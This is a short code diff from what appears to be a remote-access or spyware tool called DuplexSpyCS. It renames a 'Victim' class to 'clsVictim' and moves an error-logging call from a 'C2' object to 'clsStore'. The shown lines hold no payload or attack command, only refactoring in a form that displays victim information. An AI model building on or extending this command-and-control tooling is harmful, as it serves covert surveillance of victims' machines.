@@ -12,7 +12,7 @@ namespace DuplexSpyCS
 {
     public partial class frmInfo : Form
     {
-        public Victim v;
+        public clsVictim v;
         private Dictionary<string, string> dic_Screen = new Dictionary<string, string>();
 
         public frmInfo()
@@ -50,7 +50,7 @@ namespace DuplexSpyCS
             catch (Exception ex)
             {
                 MessageBox.Show(ex.Message);
-                C2.sql_conn.WriteSysErrorLogs(ex.Message);
+                clsStore.sql_conn.WriteSysErrorLogs(ex.Message);
             }
         }
 
